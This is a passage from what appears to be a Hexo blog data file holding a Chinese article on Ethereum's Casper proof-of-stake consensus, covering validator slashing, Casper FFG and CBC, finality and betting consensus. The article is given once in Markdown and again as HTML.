Bontje在“StackExchange”的回答中标注的那样，Casper设计了苛刻的激励来保证网络的安全，包括惩罚离线的矿工，不管它是有意还是无意的。这意味着验证者将不得不变得对他们的节点正常运行时间小心翼翼.粗心或者懒惰都将导致他们失去自己保证金.这一属性减少了对交易和整体利用率的审查.围绕着所有这些，这种“惩罚”属性同样给予了Casper相对标准工作量证明协议的明显优势。\n![](/images/pos_createblock.png)\n如上图所示,在一个工作量证明协议中，一个矿工会在蓝色链上还是红色链上挖矿并不重要.因为诚实的和恶意的矿工都将花费同等数量的资源。然而，在Casper中，如果一个诚实的验证者在蓝色链上挖矿，他们将得到与他们的赌注成比例的奖励，但一个恶意的矿工将因为下注在红色链条上而失去他们的保证金。\n\n### Casper版本\nCasper不是一个具体的项目.它是两个研究项目的融合，这两个在最近一直由以太坊开发者团队承担：\n- Casper the Friendly Finality Gadget（FFG）\n- Casper the Friendly GHOST: Correct-by-Construction（CBC）\n\n### Casper FFG\nCasper FFG也就是Vitalik版Casper，是一个混合PoW/PoS共识机制,它是正准备进行初步应用的版本，也是被精心设计好来缓冲权益证明的转变过程的.设计的方式是，一个权益证明协议被叠加在正常的以太坊版工作量证明协议上.虽然区块仍将通过工作量证明来挖出，每50个区块就将有一个权益证明检查点，也就是网络中验证者评估确定性（Finality）的地方。\n\n### 确定性（Finality）\n确定性（Finality），从一个非常宽松的意义上来说，意味着一旦一个特定的操作完成，它将永远被蚀刻在历史上，没有任何东西可以逆转这个操作.在处理金融事务的领域，这是非常重要的.例如,A在一个公司里拥有特定数目的一种资产.就算公司的某些进程中出了一点小故障，A也不应该需要恢复对该资产的所有权.\n有人说，工作量证明是唯一一种在区块链上实现确定性的方式.但是，这并不是必然正确的.真相远比这个要复杂很多。\n正如Vitalic Buterin提出的:世界上没有一个系统可以提供100%的确定性.黑进一个系统，或者物理上破解一份注册表并篡改数字以改变一个人的资产负债表，都是有可能的.这也是中心化机构的一个大问题.但是，分布式的系统也会面临同样的问题。\n实际上，比特币是工作量证明机制的典范，至少三次曾经面临确定性问题.在一个例子中，链必须分叉，因为一个Bug存在于软件的一个版本中但在其它版本中并不存在.这在社区中导致了分裂，一部分人拒接接受被另一部分人所接受的链.这次分裂在6个小时中被解决。\n所以，问题在于，Casper FFG如何能够提供确定性？根据Vitalik的说法 ，因为下面三个理由，Casper保证可以提供比工作量证明更强的确定性:\n- 完全经济确定性.三分之二的验证者会下最大几率的赌注使区块达到最终一致.因此，对他们来说，串谋以及攻击网络的激励是非常小的，因为，如果他们这样做的话，他们将危及自己的保证金.Vlad Zamfir更好地解释了这一点，他说：“设想一种版本的工作量证明，如果你参与一场51%供给的话，你的矿机会烧毁.”\n- 假设整个网络由三个人组成：Alice，Bob，和Charlie.假设Alice和Bob将他们的保证金放在一种结论上，同时，Bob和Charlie把他们的保证金放在一个与之对立的结论上。不管发生什么事，Alice或者Charlie其中一人肯定会损失一大笔钱.所以，正如你可以看到的，验证者没有动机去串谋或用恶意的方式行动，因为他们总会失去一大笔钱\n- 然而，如果双重确定性（Double Finality）发生的话，还有一种意外事故处理方案.如果双重确定性发生的话，用户可以选择他们想到哪条链上去。不管哪条链，得到多数票的就成为主链.基本上，在Casper上，双重确认会导致硬分叉而不是回滚。\n\n### Casper CBC\nCasper CBC也就是Vlad版Casper使用建构修正（correct-by-construction，CBC）协议。\n下面是一个普通的协议设计：\n- 正式指定协议\n- 定义该协议必须满足的属性\n- 证明该协议可以满足给定的属性\n\n而CBC协议的设计是：\n- 正式地但只是部分地指定协议\n- 定义该协议必须指定的属性\n- 从满足所有它被规定去指明的属性中推导出该协议\n- 提出一个合理估计的错误的例外情况\n- 列出所有在未来可能发生的错误\n\n所以，Casper CBC要做的事情，就是不断进行微调、让这个只是部分建构好的协议更加完美，直到它变成完全版。目前来说，以太坊开发者团队一直在努力地开发这两个Casper项目.很明显，这不会是最终版本，但不管这最终版本是什么，它肯定会受到Vlad的和Vitalik的Casper的深刻影响.正如刚刚提到过的，Vitalik的Casper将被初步运行以缓冲从PoW到PoS的转变.而Vlad的Casper，通过使用一个“理想对手”推导出一个安全性论证\n\n## Casper知识\n### Casper:去中心化\n![](/images/pos_decentralization.png)\n正如在上图看到的，工作量证明协议不再是真正对去中心化友好的了。\n大部分哈希算力集中在几个特定的矿池，而这意味着无论发生什么事，他们总会比其他人有更大的机会挖到区块、获得奖励。\n因为他们可以获得更多钱，他们可以买得起更好更快的ASIC设备.这基本上意味着，无论发生什么，大矿池将总是比个人和小矿池拥有优势.换句话来说，富有的将变得更富有。\n权益证明通过让挖矿完全虚拟化使得这一切都无关紧要.然而，这不是权益证明减缓中心化效果的唯一途径.为了理解这个，首先需要弄懂“经济规模”意味着什么。\n跟大企业很像，大矿池可以通过下列途径减少他们投入资源的成本：\n- 在大规模运营中分摊固定成本\n- 作为一个更大的经营主体，拥有议价能力\n\n这意味着，一个大而有影响力的矿池可以一美元又一美元地比其他矿池生产更多哈希算力，即便他们投入了等量的资金。\n这一问题在权益证明中完全被消解了，因为一个简单的原因.在权益证明中你投资一份保证金.你不能轻易地结成矿池然后让你的保证金一美元又一美元地升值.在一天结束的时候，一美元还是一美元.规模经济在这里不起作用。\n\n### Casper:能源效率\n上面讲过,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高.最糟糕的部分是，能源浪费是为了能源浪费.尤其是比特币，其对能源的欲望是非常贪婪的。\n\n所以，很明显，比特币使用太多电力了，太多钱被花在资源上了.但是，外部成本是大量的电力消耗对环境产生的影响必定是巨大的。\n\n虽然毫无疑问地比特币和工作量证明已经造成了大量积极的社会影响，我们至少应该看看权益证明系统可以做到怎样的规模，以及，它是否可以在不消耗那么多电力的情况下工作。\n\n### Casper:经济安全\nCasper的最大优势是它的经济安全性.假设你是一个验证者，并且你将你自己的钱作为保证金存入网络.以最大化网络利益的方式行事也是你自己的利益.知道了如果有恶意的行为你的保证金中的一大部分将被罚没，你为什么还会那样做呢？\n\n当你有很多钱锁定在里面的时候，你为什么还要攻击网络、损害币值呢？同样地，“惩罚效应”消除了Vitalik定义的“驻守重生点攻击（spawn camping attack）”的可能性。\n\n在权益证明中，重生点攻击可以被防止，因为一个简单的事实：一次攻击将导致惩罚，没收已投入的保证金.如果你没有投入任何保证金，就不能成为Casper验证人。\n\n### 以太坊Casper的未来\nVitalik\nButerin说不仅Casper准备好接受测试了，它还可以在客户端更新代码时提供一个安全提升.虽然看起来并不像它已经准备好用来广泛普及了，但第一个Casper测试网发布的日子看起来是越来越近了。\n\n权益证明是否将要实施并不是一个问题，问题是什么时候能够实施.以太坊“宁静”（Serenity）应该是一个权益证明网络.此前我们并不是从未见过PoS的实行，Peercoin非常成功地运用了它.但是，我们从还从来没有看过在这个层面采用该协议。也许，如果Casper被成功运行的话，另一个加密货币会跟风并且做出转换.不管事情会变成什么样，Casper带来了非常多迷人的可能性。\n\n## Casper技术\n### 投注共识\nCasper是一种以太坊下一代的共识机制,属于PoS Casper的共识是按块达成的而不是像PoS那样按链达成的。\n\nCasper向公开经济学共识这个领域引入了一个根本上全新的理念作为自己的基础：投注共识.投注共识的核心思想很简单：为验证人(validator)提供与协议对赌哪个块会被最终确定的机会.在这里对某个区块X的投注就是一笔交易，在所有区块X被处理了的世界中都会带给验证人Y个币的奖励（奖励是凭空“印”出来的，因而是“与协议”对赌），而在所有区块X没有被处理的世界中会对验证人收取Z个币的罚款（罚金被销毁）。\n\n为了防止验证人在不同的世界中提供不同的投注,还有一个简单严格的条款:如果有两次投注序号一样,或者说提交了一个无法让Casper合约处理的投注,会失去所有保证金..从这一点可以看出,Casper与传统的PoS不同的是Casper有惩罚机制,这样非法节点通过恶意攻击网络不仅得不到交易费,而且还面临着保证金被没收的风险。\n\n只有在相信区块X在人们关心的那个世界中被处理的可能性足够大时，这才是值得去做的交易，验证人才会愿意投注.然而，接下来就是经济上递归的有趣部分：人们关心的那个世界，也就是用户的客户端在用户想要知道他们的账户余额或是合约的状态时所展现的那个状态，本身就是根据人们对哪个区块投注最多推导出来的.因此,每一个验证人都具有根据他们所预期的其他人的投注情况进行投注的动机，驱使这个过程走向收敛。\n\n一个有帮助的类比是工作量证明共识 - 它本身看起来非常独特，实际上可以成为投注共识的一个特别子模型.理由如下：当你基于一个块挖矿时，你是在花费每秒E的电力成本换取每秒p的出块概率，并且在所有包含你的出块的分叉中获得R个币，在其它分叉中分文不得。\n![](/images/pos_createblock2.png)\n因此，每一秒钟，在你挖矿的链上你可以获得p * (R-E) 的期望收益，在其它链上遭受E的损失；因此你的挖矿选择可以理解为下注赌你所在的链有 E:p * (R-E) 的相对概率(odds)胜出。\n比如，假设p等于百万分之一，R是25个币约等于10000美元，而E是0.007美元，则在胜出链上每秒钟的期望收益是0.000001 * 10000 - 0.007 = 0.003，在失败链上的损失是0.007的电力成本，因此这是在赌自己挖矿的链有7:3的相对概率胜出.注意工作量证明满足上面所说的经济上递归的要求：用户的客户端通过处理拥有最大工作量的那条链来计算其账户余额。\n\n投注共识可以看作是包含了以特定方式看待的工作量证明的一个框架，也适合为其他多种类型的共识协议提供能促进收敛的经济博弈.例如传统的拜占庭容错共识协议中，通常在对某个结果进行最后\"commit\"之前还有\"pre-votes\"和\"pre-commits\"的概念；在投注共识的模型下，我们可以把每一阶段都变成投注，这样后面阶段的参与者就有更大把握相信前面阶段的参与者“真的是这个意思”。\n\n投注共识还可以用于激励链外人类共识(out-of-band human consensus)的正确行为，为了克服类似51%攻击的极端情况有需要的话.假设有人购买了一条PoS链上超过一半的币，并进行攻击，那么社区只需要协商出一个让客户端忽略攻击者分叉的补丁，就能自动让攻击者失去所有的币.一个极有野心的目标是让在线节点可以自动的产生这种分叉决定,如果能成功实现，传统容错研究中的一个被低估但却重要的结论,在强同步假设下，即使几乎所有节点都在尝试攻击系统，剩下的节点依然可以达成共识,也可以被纳入投注共识的框架中。\n\n在投注共识的情境中，不同的共识协议只在一件事情上有区别：谁，可以以什么赔率，投多少注？工作量证明只提供了一种赌局：投注胜出链有E:p * R-E的相对概率包含你自己出的块.在广义的投注共识中，依据一种被称为评分规则(scoring rule)的机制我们本质上可以提供无限多种赌局：在1:1上压极小的一注，在1.000001:1上也压极小注，在1.000002:1上也压极小注，如此继续。\n\n![](/images/pos_bet.png)\n参与者依然可以选择在每一个概率等级上的这些极小边际投注的确切大小，但大体上这个技术让我们能打探出验证人认为某个块会被确认的相当精确的概率读数.如果验证人认为一个块有90%的概率会被确认，那么他们就会接受所有相对概率低于9:1的赌局，拒绝相对概率高于9:1的赌局，而协议就能基于这一点准确得出这个块会被确认的概率是90%的“看法”.事实上，显示原理(revelationprinciple)告诉我们可以要求验证人直接给出他们对某个块被确认概率的“看法”的签名消息，让协议代表验证人计算投注。\n\n![](/pos_voting.png)\n从上面的微积分图中，可以得到在每一个概率等级上计算总奖励和总惩罚的简单函数，计算结果在数学上等价于根据验证人信心在所有概率等级上形成的投注的无限集合的总和.一个简单的例子是s(p)= p(1-p)和f(p) = (p/(1-p))^2/2，这里s计算如果你投注的事件发生能获得的奖励，f 计算如果没有发生你受到的惩罚。\n投注共识的广义形式有一个重要优点.在工作量证明中，给定区块背后的“经济权重”仅仅随着时间线性增加：如果一个块有6个确认，那么要撤销它只需要花费矿工大约6倍于出块奖励（在均衡态下）的成本，而如果一个块有600个确认，那么撤销它的成本就是出块奖励的600倍.在广义的投注共识中，验证人在一个块上投入的经济权重可以指数级增加：如果其他大多数验证人愿意以10:1下注，你可能会想冒险以20:1下注；而一旦几乎所有人都增加到20:1，你可能会跳到40:1或者更高.因此，一个块很可能在几分钟之内，取决于验证人有多少勇气（以及协议提供的激励大小），就达到一种“准最终确定”的状态，这种状态下验证人的所有保证金都成为了支持这个块的投注。\n","slug":"以太坊POS-Casper技术研究报告","published":1,"updated":"2018-03-21T03:07:19.000Z","layout":"post","photos":[],"link":"","_id":"cjf7piav6000epkworyqsrfdo","content":"<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><h3 id=\"PoW：Proof-of-Work，工作量证明\"><a href=\"#PoW：Proof-of-Work，工作量证明\" class=\"headerlink\" title=\"PoW：Proof of Work，工作量证明\"></a>PoW：Proof of Work，工作量证明</h3><p>依赖机器进行数学运算来获取记账权,资源消耗相比其他共识机制高、可监管性弱,同时每次达成共识需要全网共同参与运算,性能效率比较低,容错性方面允许全网50%节点出错。</p>\n<h3 id=\"PoS：Proof-of-Stake，权益-股权-证明\"><a href=\"#PoS：Proof-of-Stake，权益-股权-证明\" class=\"headerlink\" title=\"PoS：Proof of Stake，权益(股权)证明\"></a>PoS：Proof of Stake，权益(股权)证明</h3><p>主要思想是节点记账权的获得难度与节点持有的权益成反比,相对于PoW,一定程度减少了数学运算带来的资源消耗,性能也得到了相应的提升,但依然是基于哈希运算竞争获取记账权的方式,可监管性弱.该共识机制容错性和PoW相同.它是Pow的一种升级共识机制,根据每个节点所占代币的比例和时间,等比例的降低挖矿难度,从而加快找随机数的速度。</p>\n<h2 id=\"以太坊Casper\"><a href=\"#以太坊Casper\" class=\"headerlink\" title=\"以太坊Casper\"></a>以太坊Casper</h2><h3 id=\"优势\"><a href=\"#优势\" class=\"headerlink\" title=\"优势\"></a>优势</h3><ul>\n<li>不需要消耗大量的资源就可以保证区块链的安全性.参与 PoS 的代币数量相当于 PoW<br>算力，达到了同样的出块效果却不用消耗真实的电力,根据比特币能源消耗指数,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高。</li>\n<li>因为不再需要大量资源，就不需要最大化的发行新币来激励参与者,从而降低网络的压力.理论上甚至有可能出现负净发行,其中一部分交易费用被消耗掉，因此供应随着时间的推移而下降。</li>\n<li>权益证明为更广泛的使用博弈论机制设计的技术敞开了大门,以便更好地阻止中心化垄断的形成,以及(如果确实形成了中心化垄断)伤害网络的行为。</li>\n<li>降低中心化风险之后，经济规模的扩大便不是问题.在工作量证明机制中，当资本多到一定程度，便可以投入更大规模的生产设备，拉大和其他人的差距（投入一千万的成本所获得的收益不只是投入一百万的十倍）.而在权益证明机制中，一千万的投资只能保证获取一百万投资的十倍的收益。</li>\n<li>相对于工作量证明，能够使用经济处罚来大大提高各种形式的 51％ 攻击的成本.正如 Vlad Zamfir 所说的，“只要参与了 51％ 攻击，ASIC 矿场就会被烧毁”。</li>\n</ul>\n<h3 id=\"Casper与Pos的区别\"><a href=\"#Casper与Pos的区别\" class=\"headerlink\" title=\"Casper与Pos的区别\"></a>Casper与Pos的区别</h3><p>Casper实施了一个进程，使得它可以惩罚所有的恶意因素.这就是权益证明在Casper下是如何工作的：</p>\n<ul>\n<li>验证者押下一定比例的他们拥有的以太币作为保证金</li>\n<li>验证者开始验证区块.也就是说，当验证者发现一个区块并认为这个区块可以被加到链上的时候，验证者将以通过押下赌注来验证它</li>\n<li>如果该区块被加到链上，然后验证者们将得到一个跟他们的赌注成比例的奖励</li>\n<li>但是，如果一个验证者采用一种恶意的方式行动、试图做“无利害关系”的事，他们将立即遭到惩罚，他们所有的权益都会被砍掉</li>\n</ul>\n<p>正如以上，Casper被设计成可以在一个无需信任的系统上工作，并且是更加拜占庭容错的。<br>任何人，如果以一种恶意的，或者说有拜占庭叛徒式的方式行动，就会立即受到惩罚、失去他们的保证金.这就是Casper不同于其他权益证明协议的地方.恶意元素会失去一些东西，所以，“无利害关系”是不可能的。<br>这不是唯一一个Casper可以惩罚验证者的地方，正如Hudson James以及Joris Bontje在“StackExchange”的回答中标注的那样，Casper设计了苛刻的激励来保证网络的安全，包括惩罚离线的矿工，不管它是有意还是无意的。这意味着验证者将不得不变得对他们的节点正常运行时间小心翼翼.粗心或者懒惰都将导致他们失去自己保证金.这一属性减少了对交易和整体利用率的审查.围绕着所有这些，这种“惩罚”属性同样给予了Casper相对标准工作量证明协议的明显优势。<br><img src=\"/images/pos_createblock.png\" alt=\"\"><br>如上图所示,在一个工作量证明协议中，一个矿工会在蓝色链上还是红色链上挖矿并不重要.因为诚实的和恶意的矿工都将花费同等数量的资源。然而，在Casper中，如果一个诚实的验证者在蓝色链上挖矿，他们将得到与他们的赌注成比例的奖励，但一个恶意的矿工将因为下注在红色链条上而失去他们的保证金。</p>\n<h3 id=\"Casper版本\"><a href=\"#Casper版本\" class=\"headerlink\" title=\"Casper版本\"></a>Casper版本</h3><p>Casper不是一个具体的项目.它是两个研究项目的融合，这两个在最近一直由以太坊开发者团队承担：</p>\n<ul>\n<li>Casper the Friendly Finality Gadget（FFG）</li>\n<li>Casper the Friendly GHOST: Correct-by-Construction（CBC）</li>\n</ul>\n<h3 id=\"Casper-FFG\"><a href=\"#Casper-FFG\" class=\"headerlink\" title=\"Casper FFG\"></a>Casper FFG</h3><p>Casper FFG也就是Vitalik版Casper，是一个混合PoW/PoS共识机制,它是正准备进行初步应用的版本，也是被精心设计好来缓冲权益证明的转变过程的.设计的方式是，一个权益证明协议被叠加在正常的以太坊版工作量证明协议上.虽然区块仍将通过工作量证明来挖出，每50个区块就将有一个权益证明检查点，也就是网络中验证者评估确定性（Finality）的地方。</p>\n<h3 id=\"确定性（Finality）\"><a href=\"#确定性（Finality）\" class=\"headerlink\" title=\"确定性（Finality）\"></a>确定性（Finality）</h3><p>确定性（Finality），从一个非常宽松的意义上来说，意味着一旦一个特定的操作完成，它将永远被蚀刻在历史上，没有任何东西可以逆转这个操作.在处理金融事务的领域，这是非常重要的.例如,A在一个公司里拥有特定数目的一种资产.就算公司的某些进程中出了一点小故障，A也不应该需要恢复对该资产的所有权.<br>有人说，工作量证明是唯一一种在区块链上实现确定性的方式.但是，这并不是必然正确的.真相远比这个要复杂很多。<br>正如Vitalic Buterin提出的:世界上没有一个系统可以提供100%的确定性.黑进一个系统，或者物理上破解一份注册表并篡改数字以改变一个人的资产负债表，都是有可能的.这也是中心化机构的一个大问题.但是，分布式的系统也会面临同样的问题。<br>实际上，比特币是工作量证明机制的典范，至少三次曾经面临确定性问题.在一个例子中，链必须分叉，因为一个Bug存在于软件的一个版本中但在其它版本中并不存在.这在社区中导致了分裂，一部分人拒接接受被另一部分人所接受的链.这次分裂在6个小时中被解决。<br>所以，问题在于，Casper FFG如何能够提供确定性？根据Vitalik的说法 ，因为下面三个理由，Casper保证可以提供比工作量证明更强的确定性:</p>\n<ul>\n<li>完全经济确定性.三分之二的验证者会下最大几率的赌注使区块达到最终一致.因此，对他们来说，串谋以及攻击网络的激励是非常小的，因为，如果他们这样做的话，他们将危及自己的保证金.Vlad Zamfir更好地解释了这一点，他说：“设想一种版本的工作量证明，如果你参与一场51%供给的话，你的矿机会烧毁.”</li>\n<li>假设整个网络由三个人组成：Alice，Bob，和Charlie.假设Alice和Bob将他们的保证金放在一种结论上，同时，Bob和Charlie把他们的保证金放在一个与之对立的结论上。不管发生什么事，Alice或者Charlie其中一人肯定会损失一大笔钱.所以，正如你可以看到的，验证者没有动机去串谋或用恶意的方式行动，因为他们总会失去一大笔钱</li>\n<li>然而，如果双重确定性（Double Finality）发生的话，还有一种意外事故处理方案.如果双重确定性发生的话，用户可以选择他们想到哪条链上去。不管哪条链，得到多数票的就成为主链.基本上，在Casper上，双重确认会导致硬分叉而不是回滚。</li>\n</ul>\n<h3 id=\"Casper-CBC\"><a href=\"#Casper-CBC\" class=\"headerlink\" title=\"Casper CBC\"></a>Casper CBC</h3><p>Casper CBC也就是Vlad版Casper使用建构修正（correct-by-construction，CBC）协议。<br>下面是一个普通的协议设计：</p>\n<ul>\n<li>正式指定协议</li>\n<li>定义该协议必须满足的属性</li>\n<li>证明该协议可以满足给定的属性</li>\n</ul>\n<p>而CBC协议的设计是：</p>\n<ul>\n<li>正式地但只是部分地指定协议</li>\n<li>定义该协议必须指定的属性</li>\n<li>从满足所有它被规定去指明的属性中推导出该协议</li>\n<li>提出一个合理估计的错误的例外情况</li>\n<li>列出所有在未来可能发生的错误</li>\n</ul>\n<p>所以，Casper CBC要做的事情，就是不断进行微调、让这个只是部分建构好的协议更加完美，直到它变成完全版。目前来说，以太坊开发者团队一直在努力地开发这两个Casper项目.很明显，这不会是最终版本，但不管这最终版本是什么，它肯定会受到Vlad的和Vitalik的Casper的深刻影响.正如刚刚提到过的，Vitalik的Casper将被初步运行以缓冲从PoW到PoS的转变.而Vlad的Casper，通过使用一个“理想对手”推导出一个安全性论证</p>\n<h2 id=\"Casper知识\"><a href=\"#Casper知识\" class=\"headerlink\" title=\"Casper知识\"></a>Casper知识</h2><h3 id=\"Casper-去中心化\"><a href=\"#Casper-去中心化\" class=\"headerlink\" title=\"Casper:去中心化\"></a>Casper:去中心化</h3><p><img src=\"/images/pos_decentralization.png\" alt=\"\"><br>正如在上图看到的，工作量证明协议不再是真正对去中心化友好的了。<br>大部分哈希算力集中在几个特定的矿池，而这意味着无论发生什么事，他们总会比其他人有更大的机会挖到区块、获得奖励。<br>因为他们可以获得更多钱，他们可以买得起更好更快的ASIC设备.这基本上意味着，无论发生什么，大矿池将总是比个人和小矿池拥有优势.换句话来说，富有的将变得更富有。<br>权益证明通过让挖矿完全虚拟化使得这一切都无关紧要.然而，这不是权益证明减缓中心化效果的唯一途径.为了理解这个，首先需要弄懂“经济规模”意味着什么。<br>跟大企业很像，大矿池可以通过下列途径减少他们投入资源的成本：</p>\n<ul>\n<li>在大规模运营中分摊固定成本</li>\n<li>作为一个更大的经营主体，拥有议价能力</li>\n</ul>\n<p>这意味着，一个大而有影响力的矿池可以一美元又一美元地比其他矿池生产更多哈希算力，即便他们投入了等量的资金。<br>这一问题在权益证明中完全被消解了，因为一个简单的原因.在权益证明中你投资一份保证金.你不能轻易地结成矿池然后让你的保证金一美元又一美元地升值.在一天结束的时候，一美元还是一美元.规模经济在这里不起作用。</p>\n<h3 id=\"Casper-能源效率\"><a href=\"#Casper-能源效率\" class=\"headerlink\" title=\"Casper:能源效率\"></a>Casper:能源效率</h3><p>上面讲过,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高.最糟糕的部分是，能源浪费是为了能源浪费.尤其是比特币，其对能源的欲望是非常贪婪的。</p>\n<p>所以，很明显，比特币使用太多电力了，太多钱被花在资源上了.但是，外部成本是大量的电力消耗对环境产生的影响必定是巨大的。</p>\n<p>虽然毫无疑问地比特币和工作量证明已经造成了大量积极的社会影响，我们至少应该看看权益证明系统可以做到怎样的规模，以及，它是否可以在不消耗那么多电力的情况下工作。</p>\n<h3 id=\"Casper-经济安全\"><a href=\"#Casper-经济安全\" class=\"headerlink\" title=\"Casper:经济安全\"></a>Casper:经济安全</h3><p>Casper的最大优势是它的经济安全性.假设你是一个验证者，并且你将你自己的钱作为保证金存入网络.以最大化网络利益的方式行事也是你自己的利益.知道了如果有恶意的行为你的保证金中的一大部分将被罚没，你为什么还会那样做呢？</p>\n<p>当你有很多钱锁定在里面的时候，你为什么还要攻击网络、损害币值呢？同样地，“惩罚效应”消除了Vitalik定义的“驻守重生点攻击（spawn camping attack）”的可能性。</p>\n<p>在权益证明中，重生点攻击可以被防止，因为一个简单的事实：一次攻击将导致惩罚，没收已投入的保证金.如果你没有投入任何保证金，就不能成为Casper验证人。</p>\n<h3 id=\"以太坊Casper的未来\"><a href=\"#以太坊Casper的未来\" class=\"headerlink\" title=\"以太坊Casper的未来\"></a>以太坊Casper的未来</h3><p>Vitalik<br>Buterin说不仅Casper准备好接受测试了，它还可以在客户端更新代码时提供一个安全提升.虽然看起来并不像它已经准备好用来广泛普及了，但第一个Casper测试网发布的日子看起来是越来越近了。</p>\n<p>权益证明是否将要实施并不是一个问题，问题是什么时候能够实施.以太坊“宁静”（Serenity）应该是一个权益证明网络.此前我们并不是从未见过PoS的实行，Peercoin非常成功地运用了它.但是，我们从还从来没有看过在这个层面采用该协议。也许，如果Casper被成功运行的话，另一个加密货币会跟风并且做出转换.不管事情会变成什么样，Casper带来了非常多迷人的可能性。</p>\n<h2 id=\"Casper技术\"><a href=\"#Casper技术\" class=\"headerlink\" title=\"Casper技术\"></a>Casper技术</h2><h3 id=\"投注共识\"><a href=\"#投注共识\" class=\"headerlink\" title=\"投注共识\"></a>投注共识</h3><p>Casper是一种以太坊下一代的共识机制,属于PoS Casper的共识是按块达成的而不是像PoS那样按链达成的。</p>\n<p>Casper向公开经济学共识这个领域引入了一个根本上全新的理念作为自己的基础：投注共识.投注共识的核心思想很简单：为验证人(validator)提供与协议对赌哪个块会被最终确定的机会.在这里对某个区块X的投注就是一笔交易，在所有区块X被处理了的世界中都会带给验证人Y个币的奖励（奖励是凭空“印”出来的，因而是“与协议”对赌），而在所有区块X没有被处理的世界中会对验证人收取Z个币的罚款（罚金被销毁）。</p>\n<p>为了防止验证人在不同的世界中提供不同的投注,还有一个简单严格的条款:如果有两次投注序号一样,或者说提交了一个无法让Casper合约处理的投注,会失去所有保证金..从这一点可以看出,Casper与传统的PoS不同的是Casper有惩罚机制,这样非法节点通过恶意攻击网络不仅得不到交易费,而且还面临着保证金被没收的风险。</p>\n<p>只有在相信区块X在人们关心的那个世界中被处理的可能性足够大时，这才是值得去做的交易，验证人才会愿意投注.然而，接下来就是经济上递归的有趣部分：人们关心的那个世界，也就是用户的客户端在用户想要知道他们的账户余额或是合约的状态时所展现的那个状态，本身就是根据人们对哪个区块投注最多推导出来的.因此,每一个验证人都具有根据他们所预期的其他人的投注情况进行投注的动机，驱使这个过程走向收敛。</p>\n<p>一个有帮助的类比是工作量证明共识 - 它本身看起来非常独特，实际上可以成为投注共识的一个特别子模型.理由如下：当你基于一个块挖矿时，你是在花费每秒E的电力成本换取每秒p的出块概率，并且在所有包含你的出块的分叉中获得R个币，在其它分叉中分文不得。<br><img src=\"/images/pos_createblock2.png\" alt=\"\"><br>因此，每一秒钟，在你挖矿的链上你可以获得p <em> (R-E) 的期望收益，在其它链上遭受E的损失；因此你的挖矿选择可以理解为下注赌你所在的链有 E:p </em> (R-E) 的相对概率(odds)胜出。<br>比如，假设p等于百万分之一，R是25个币约等于10000美元，而E是0.007美元，则在胜出链上每秒钟的期望收益是0.000001 * 10000 - 0.007 = 0.003，在失败链上的损失是0.007的电力成本，因此这是在赌自己挖矿的链有7:3的相对概率胜出.注意工作量证明满足上面所说的经济上递归的要求：用户的客户端通过处理拥有最大工作量的那条链来计算其账户余额。</p>\n<p>投注共识可以看作是包含了以特定方式看待的工作量证明的一个框架，也适合为其他多种类型的共识协议提供能促进收敛的经济博弈.例如传统的拜占庭容错共识协议中，通常在对某个结果进行最后”commit”之前还有”pre-votes”和”pre-commits”的概念；在投注共识的模型下，我们可以把每一阶段都变成投注，这样后面阶段的参与者就有更大把握相信前面阶段的参与者“真的是这个意思”。</p>\n<p>投注共识还可以用于激励链外人类共识(out-of-band human consensus)的正确行为，为了克服类似51%攻击的极端情况有需要的话.假设有人购买了一条PoS链上超过一半的币，并进行攻击，那么社区只需要协商出一个让客户端忽略攻击者分叉的补丁，就能自动让攻击者失去所有的币.一个极有野心的目标是让在线节点可以自动的产生这种分叉决定,如果能成功实现，传统容错研究中的一个被低估但却重要的结论,在强同步假设下，即使几乎所有节点都在尝试攻击系统，剩下的节点依然可以达成共识,也可以被纳入投注共识的框架中。</p>\n<p>在投注共识的情境中，不同的共识协议只在一件事情上有区别：谁，可以以什么赔率，投多少注？工作量证明只提供了一种赌局：投注胜出链有E:p * R-E的相对概率包含你自己出的块.在广义的投注共识中，依据一种被称为评分规则(scoring rule)的机制我们本质上可以提供无限多种赌局：在1:1上压极小的一注，在1.000001:1上也压极小注，在1.000002:1上也压极小注，如此继续。</p>\n<p><img src=\"/images/pos_bet.png\" alt=\"\"><br>参与者依然可以选择在每一个概率等级上的这些极小边际投注的确切大小，但大体上这个技术让我们能打探出验证人认为某个块会被确认的相当精确的概率读数.如果验证人认为一个块有90%的概率会被确认，那么他们就会接受所有相对概率低于9:1的赌局，拒绝相对概率高于9:1的赌局，而协议就能基于这一点准确得出这个块会被确认的概率是90%的“看法”.事实上，显示原理(revelationprinciple)告诉我们可以要求验证人直接给出他们对某个块被确认概率的“看法”的签名消息，让协议代表验证人计算投注。</p>\n<p><img src=\"/pos_voting.png\" alt=\"\"><br>从上面的微积分图中，可以得到在每一个概率等级上计算总奖励和总惩罚的简单函数，计算结果在数学上等价于根据验证人信心在所有概率等级上形成的投注的无限集合的总和.一个简单的例子是s(p)= p(1-p)和f(p) = (p/(1-p))^2/2，这里s计算如果你投注的事件发生能获得的奖励，f 计算如果没有发生你受到的惩罚。<br>投注共识的广义形式有一个重要优点.在工作量证明中，给定区块背后的“经济权重”仅仅随着时间线性增加：如果一个块有6个确认，那么要撤销它只需要花费矿工大约6倍于出块奖励（在均衡态下）的成本，而如果一个块有600个确认，那么撤销它的成本就是出块奖励的600倍.在广义的投注共识中，验证人在一个块上投入的经济权重可以指数级增加：如果其他大多数验证人愿意以10:1下注，你可能会想冒险以20:1下注；而一旦几乎所有人都增加到20:1，你可能会跳到40:1或者更高.因此，一个块很可能在几分钟之内，取决于验证人有多少勇气（以及协议提供的激励大小），就达到一种“准最终确定”的状态，这种状态下验证人的所有保证金都成为了支持这个块的投注。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><h3 id=\"PoW：Proof-of-Work，工作量证明\"><a href=\"#PoW：Proof-of-Work，工作量证明\" class=\"headerlink\" title=\"PoW：Proof of Work，工作量证明\"></a>PoW：Proof of Work，工作量证明</h3><p>依赖机器进行数学运算来获取记账权,资源消耗相比其他共识机制高、可监管性弱,同时每次达成共识需要全网共同参与运算,性能效率比较低,容错性方面允许全网50%节点出错。</p>\n<h3 id=\"PoS：Proof-of-Stake，权益-股权-证明\"><a 